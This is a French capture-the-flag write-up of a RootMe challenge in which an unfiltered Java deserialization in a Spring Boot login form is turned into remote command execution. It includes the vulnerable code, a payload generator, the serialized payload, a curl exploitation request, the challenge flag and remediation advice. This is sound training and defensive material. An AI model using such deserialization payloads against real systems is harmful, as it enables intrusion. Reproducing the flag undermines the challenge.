# Writeup — RootMe « Administrator panel » (désérialisation Java → RCE)

> **Catégorie :** Web / Java Deserialization
> **Difficulté :** intermédiaire
> **Flag :** `RM{D3s3ri4lisation_1s_m0re_fun_w1th_Cust0m_G4dgets}`

---

## 1. Résumé (TL;DR)

L'application Spring Boot expose un formulaire de login dont le champ caché `csrf`
contient un **objet Java sérialisé**. Le serveur le **désérialise sans aucun filtre de
classes**. En remplaçant l'objet `CSRF` légitime par un objet `DebugHelper` (une classe
« gadget » présente dans l'application), on déclenche à la désérialisation un
`Runtime.exec()` — soit une **exécution de code à distance (RCE)**. La sortie de la commande
est renvoyée en clair dans le message d'erreur de la page, ce qui permet de lire le flag via
`cat /flag.txt`.

**Chaîne complète :**
`csrf` (base64) → `ObjectInputStream.readObject()` → `DebugHelper.readObject()` → `run()`
→ `Runtime.getRuntime().exec(["cat","/flag.txt"])` → sortie reflétée via `toString()`.

---

## 2. Reconnaissance

La page `/login` propose un formulaire classique *username / password*. Premier réflexe :
tester quelques identifiants. **Aucune combinaison ne fonctionne** — et pour cause, le code
ne vérifie jamais les identifiants (voir §3).

En inspectant le HTML du formulaire, on remarque un **champ caché** suspect :

```html
<input type="hidden" value="rO0ABXNyABZjb20ucm9vdG1lLnNlcmlhbC5DU1JG..." name="csrf" />
```

Le préfixe **`rO0AB`** est la signature caractéristique d'un **objet Java sérialisé encodé
en base64** (les octets magiques `AC ED 00 05`). C'est le signal d'alarme n°1 :
désérialisation Java potentielle.

En décodant les couches d'encodage :

```
csrf dans la requête   → URL-encoding   (%2B, %2F, %3D)
   ↓ url-decode
base64 "rO0AB..."      → Base64
   ↓ base64-decode
octets de l'objet      → on y lit en clair : com.rootme.serial.CSRF, value, java.util.UUID
```

L'objet transmis est donc une instance de la classe `CSRF`, contenant un simple champ
`value` de type `UUID`.

---

## 3. Analyse du code

### 3.1 Le point d'entrée vulnérable

`HomeIndex.authenticate()` (contrôleur du `POST /login`) :

```java
@PostMapping("/login")
public String authenticate(Model model,
    @RequestParam String username,
    @RequestParam String password,
    @RequestParam String csrf) throws Exception {

    CSRF token = new CSRF();
    Object obj = null;
    try {
        obj = SerializationUtils.deserialize(csrf);   // (1) désérialisation de l'entrée
        token = (CSRF) obj;                            // (2) cast -> ClassCastException si pas un CSRF
        model.addAttribute("error", "Incorrect login or password.");
    } catch (Exception ex) {
        if (obj == null) {
            model.addAttribute("error", ex.getMessage());
        } else {
            model.addAttribute("error", obj.toString() + ex.getMessage());  // (3) toString() reflété !
        }
        return "login";
    }
    ...
}
```

Observations clés :

- **`username` et `password` ne sont jamais utilisés** → aucun login « normal » n'est possible.
  Le formulaire n'est qu'un prétexte pour transmettre l'objet `csrf`.
- **(1)** L'entrée utilisateur `csrf` est désérialisée directement.
- **(2)** Le `cast (CSRF)` échoue (`ClassCastException`) si l'objet n'est pas un `CSRF`…
  mais **la désérialisation a déjà eu lieu avant le cast**. Trop tard.
- **(3)** Dans le `catch`, si `obj != null`, le serveur renvoie `obj.toString()` dans la page.
  C'est notre **canal d'exfiltration**.

### 3.2 La désérialisation non sécurisée

`SerializationUtils.deserialize()` :

```java
public static Object deserialize(String data) {
    try {
        byte[] objBytes = Base64.getDecoder().decode(data);
        ByteArrayInputStream bais = new ByteArrayInputStream(objBytes);
        ObjectInputStream ois = new ObjectInputStream(bais);   // AUCUN ObjectInputFilter
        Object obj = ois.readObject();                          // reconstruit N'IMPORTE quelle classe
        ois.close();
        return obj;
    } ...
}
```

**Aucune liste blanche de classes** (`ObjectInputFilter`). On peut donc faire reconstruire
par le serveur n'importe quelle classe `Serializable` présente sur le classpath — y compris
un gadget.

### 3.3 Le gadget : `DebugHelper`

```java
public class DebugHelper implements Serializable {
    private OwnBase64[] command;
    private Boolean debug;
    private String output;

    public void run() throws IOException {
        if (!debug) {                                 // il faut debug == true
            output = "The DebugHelper is not in 'debug' mode.";
            return;
        }
        String[] commandStrings = new String[command.length];
        for (int i = 0; i < command.length; i++) {
            commandStrings[i] = command[i].decode();  // chaque OwnBase64 -> un argument
        }
        Process process = Runtime.getRuntime().exec(commandStrings);   // *** RCE ***
        // ... lecture de la sortie dans le champ `output` ...
    }

    @Override
    public String toString() {
        return "DebugHelper{output='" + output + "'}";   // la sortie est exposée ici
    }

    private final void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException {
        in.defaultReadObject();
        run();                                        // *** appelé AUTOMATIQUEMENT à la désérialisation ***
    }
}
```

C'est le cœur du challenge :

- `readObject()` est une **méthode magique** : la JVM l'appelle automatiquement pendant la
  désérialisation. Ici elle appelle `run()`.
- Si `debug == true`, `run()` exécute `Runtime.exec(command)` → **exécution de commande**.
- La sortie est stockée dans `output`, puis exposée par `toString()` — qui sera reflété dans
  la page grâce au `catch` du contrôleur (§3.1, point 3).

### 3.4 La brique `OwnBase64`

```java
public class OwnBase64 implements Serializable {
    private String encoded;
    public OwnBase64(String encoded) { this.encoded = encoded; }
    public String decode() { return new String(Base64.getDecoder().decode(this.encoded)); }
}
```

Chaque argument de la commande doit être fourni **déjà encodé en base64**, car `decode()`
fait un base64-decode côté serveur. Par exemple l'argument `cat` se stocke sous forme
`Y2F0` (= base64 de « cat »).

---

## 4. Construction de l'exploit

### 4.1 Idée

« Activer le mode debug » ne consiste **pas** à modifier le jeton `CSRF` (qui n'a pas de
champ `debug`). Il faut **remplacer entièrement** l'objet `CSRF` par un objet `DebugHelper`
avec :

- `debug = true`
- `command = [ OwnBase64("cat"), OwnBase64("/flag.txt") ]`

Le serveur se moque du nom du paramètre (`csrf`) et du type attendu : il désérialise ce qu'on
lui envoie.

### 4.2 Pourquoi il faut un générateur Java

Le format de sérialisation Java est une structure binaire précise. Impossible de la bricoler
à la main. On écrit donc un petit générateur qui **réutilise les classes du projet** et
produit le payload avec **exactement la même sérialisation que le serveur** (base64).

> ⚠️ Générer le payload **n'exécute rien** localement : `run()` n'est déclenché que par
> `readObject()` (à la *désérialisation*). On ne fait ici que *sérialiser*.

`Exploit.java` :

```java
package com.rootme.serial;

import java.util.Base64;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;

public class Exploit {
    public static void main(String[] args) throws Exception {
        OwnBase64[] command = {
            new OwnBase64(Base64.getEncoder().encodeToString("cat".getBytes())),
            new OwnBase64(Base64.getEncoder().encodeToString("/flag.txt".getBytes()))
        };
        DebugHelper payload = new DebugHelper(command, true);
        String b64 = SerializationUtils.serialize(payload);

        System.out.println("--- Base64 brut ---");
        System.out.println(b64);
        System.out.println("--- URL-encode (a coller dans csrf=) ---");
        System.out.println(URLEncoder.encode(b64, StandardCharsets.UTF_8));
    }
}
```

### 4.3 Compilation et exécution (sans rien installer, via Docker)

On réutilise l'image JDK du challenge et on compile contre les classes déjà compilées
(`target/classes`). On évite volontairement le JAR Spring Boot « fat » (ses classes sont sous
`BOOT-INF/classes/` et ne seraient pas visibles directement au classpath).

```bash
docker run --rm -v "${PWD}:/work" -w /work eclipse-temurin:17-jdk-focal \
  bash -c "javac -cp target/classes -d /tmp/b Exploit.java && \
           java -cp target/classes:/tmp/b com.rootme.serial.Exploit"
```

Sortie (payload URL-encodé, à coller dans `csrf=`) :

```
rO0ABXNyAB1jb20ucm9vdG1lLnNlcmlhbC5EZWJ1Z0hlbHBlcvPsfvD5ClRKAgADWwAHY29tbWFuZHQAHltMY29t
L3Jvb3RtZS9zZXJpYWwvT3duQmFzZTY0O0wABWRlYnVndAATTGphdmEvbGFuZy9Cb29sZWFuO0wABm91dHB1dHQA
EkxqYXZhL2xhbmcvU3RyaW5nO3hwdXIAHltMY29tLnJvb3RtZS5zZXJpYWwuT3duQmFzZTY0O74OoqGsN8lVAgAA
eHAAAAACc3IAG2NvbS5yb290bWUuc2VyaWFsLk93bkJhc2U2NIS7JPaSQhv5AgABTAAHZW5jb2RlZHEAfgADeHB0
AARZMkYwc3EAfgAHdAAMTDJac1lXY3VkSGgwc3IAEWphdmEubGFuZy5Cb29sZWFuzSBygNWc%2Bu4CAAFaAAV2YWx1
ZXhwAXA%3D
```

(En décodant, on retrouve bien `com.rootme.serial.DebugHelper`, les deux `OwnBase64`
`Y2F0`=`cat` et `L2ZsYWcudHh0`=`/flag.txt`, et le `Boolean` à `01` = `true`.)

---

## 5. Exploitation

On envoie la requête `POST /login` avec le payload dans `csrf`. Via **curl** :

```bash
curl -k -X POST \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-binary 'username=test&password=test&csrf=rO0ABXNyAB1jb20u...AXA%3D' \
  'http://challenge01.root-me.org:59087/login'
```

Dans la réponse HTML, le message d'erreur contient alors la sortie de la commande :

```html
<td >DebugHelper{output='RM{D3s3ri4lisation_1s_m0re_fun_w1th_Cust0m_G4dgets}
'}</td>
```

🏁 **Flag :** `RM{D3s3ri4lisation_1s_m0re_fun_w1th_Cust0m_G4dgets}`

---

## 6. Pièges rencontrés (et comment les éviter)

| Symptôme | Cause | Correctif |
|---|---|---|
| Décodage « bizarre » du jeton | On s'arrête au base64 sans enlever l'URL-encoding (`%2B`, `%2F`, `%3D`) | URL-decode **puis** base64-decode |
| `java.io.EOFException` | Corps de requête **tronqué** / `Content-Length` trop petit → l'objet est coupé en pleine désérialisation | Envoyer le payload **complet** (il finit par `AXA%3D`) et laisser l'outil recalculer `Content-Length` |
| `Content-Length` forcé à la main dans curl | L'en-tête manuel écrase le calcul auto | Supprimer `-H 'Content-Length: ...'` : `--data-binary` le calcule seul |
| `output` vide | Le flag n'est pas à `/flag.txt` | Régénérer avec `["ls","/"]` ou `["sh","-c","cat /flag*"]` |

---

## 7. Remédiation (côté défense)

La leçon centrale : **ne jamais désérialiser des données contrôlées par l'utilisateur** avec
la sérialisation native Java. Pistes concrètes :

1. **Changer de format** : utiliser JSON/XML avec un mapping explicite (Jackson, Gson…) plutôt
   que `ObjectInputStream`.
2. **Filtre de classes** : si la désérialisation native est inévitable, imposer un
   `ObjectInputFilter` (Java 9+) en **liste blanche** stricte des classes autorisées.
3. **Supprimer les gadgets** : ne pas laisser sur le classpath des classes `Serializable`
   dont `readObject()` (ou une chaîne d'appels) atteint des opérations sensibles
   (`Runtime.exec`, réflexion, I/O…). Ici, `DebugHelper` n'avait rien à faire en production.
4. **Intégrité** : signer/chiffrer tout blob sérialisé qui transite par le client, pour
   empêcher sa falsification.
5. **Ne pas renvoyer les détails d'erreur** (`obj.toString()`, stack traces) au client : cela
   a servi ici de canal d'exfiltration.

---

## 8. Ce qu'on retient

- `rO0AB` en base64 (ou `AC ED 00 05` en octets) = **objet Java sérialisé** → suspecter la
  désérialisation.
- Une méthode **`readObject()`** (ou `readResolve`, `validateObject`, `finalize`…) est un
  déclencheur de code automatique : c'est là que vivent les **gadgets**.
- Une RCE « aveugle » devient triviale quand l'appli **reflète** la sortie (ici via
  `toString()` dans un message d'erreur).
- Dans la vraie vie, quand aucun gadget maison n'existe, on enchaîne des classes de
  bibliothèques tierces (**gadget chains**) — outil de référence : **ysoserial**.
